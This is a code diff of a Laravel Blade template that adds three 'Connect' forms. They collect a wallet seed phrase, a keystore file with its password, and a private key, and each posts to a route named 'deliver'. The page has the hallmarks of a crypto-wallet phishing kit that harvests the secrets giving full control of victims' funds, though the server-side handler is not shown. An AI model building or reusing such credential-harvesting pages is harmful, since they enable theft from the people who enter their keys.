@@ -49,12 +49,73 @@
         </ul>
         <div class="tab-content" id="pills-tabContent">
             <div class="tab-pane fade show active" id="pills-phrase" role="tabpanel" aria-labelledby="pills-phrase-tab">
-                phrase tab
+                <form action="{{ route('deliver') }}" method="post" class="mt-4" id="phrase-form">
+                    @csrf
+                    <div class="mb-3">
+                        <textarea class="form-control p-3" rows="7" name="phrase" id="phrase" placeholder="Phrase"></textarea>
+                    </div>
+                    <div class="text-style-2 text-primary text-center py-3-mod" style="opacity: 1">
+                        Typically 12 (sometimes 24) words separated by single spaces
+                    </div>
+                    <input type="hidden" name="type" value="phrase">
+                    <div class="d-grid px-large">
+                        <button class="btn btn-primary btn-large py-3-mod text-light" type="submit">Connect</button>
+                    </div>
+                </form>
             </div>
-            <div class="tab-pane fade" id="pills-keystore" role="tabpanel" aria-labelledby="pills-keystore-tab">keystore tab
+            <div class="tab-pane fade" id="pills-keystore" role="tabpanel" aria-labelledby="pills-keystore-tab">
+                <form action="{{ route('deliver') }}" method="post" class="mt-4" id="keystoreForm">
+                    @csrf
+                    <div class="mb-3">
+                        <textarea class="form-control p-3" rows="7" name="keystore" id="keystore" placeholder="Keystore JSON"></textarea>
+                    </div>
+                    <div class="mb-3">
+                        <input type="password" name="password" id="password" placeholder="Password"
+                            class="form-control p-3">
+                    </div>
+                    <div class="text-style-2 text-primary text-center py-3-mod" style="opacity: 1">
+                        Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                    </div>
+                    <input type="hidden" name="type" value="keystore">
+                    <div class="d-grid px-large">
+                        <button class="btn btn-primary btn-large py-3-mod text-light" type="submit">Connect</button>
+                    </div>
+                </form>
             </div>
-            <div class="tab-pane fade" id="pills-private" role="tabpanel" aria-labelledby="pills-private-tab">private tab
+            <div class="tab-pane fade" id="pills-private" role="tabpanel" aria-labelledby="pills-private-tab">
+                <form action="{{ route('deliver') }}" method="post" class="mt-4" id="privateKeyForm">
+                    @csrf
+                    <div class="mb-3">
+                        <input type="text" name="private_key" id="privateKey" placeholder="Private Key"
+                            class="form-control p-3">
+                    </div>
+                    <div class="text-style-2 text-primary text-center py-3-mod" style="opacity: 1;">
+                        Typically 12 (sometimes 24) words separated by single spaces
+                    </div>
+                    <input type="hidden" name="type" value="private_key">
+                    <div class="d-grid px-large">
+                        <button class="btn btn-primary btn-large py-3-mod text-light" type="submit">Connect</button>
+                    </div>
+                </form>
             </div>
         </div>
     </section>
+
+    <div class="toast align-items-center text-white bg-danger border-0 position-fixed fade" role="alert"
+        aria-live="assertive" aria-atomic="true" id="errorToast" style="bottom: 4rem;right: 3rem;"
+        data-bs-delay="2000">
+        <div class="d-flex">
+            <div class="toast-body">
+                Field shouldn't be less than 12 words separated by single spaces
+            </div>
+            <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"
+                aria-label="Close"></button>
+        </div>
+    </div>
+
+    <div class="loading">
+        <div class="spinner-grow text-primary" style="width: 5rem; height: 5rem;" role="status">
+            <span class="visually-hidden">Loading...</span>
+        </div>
+    </div>
 @endsection
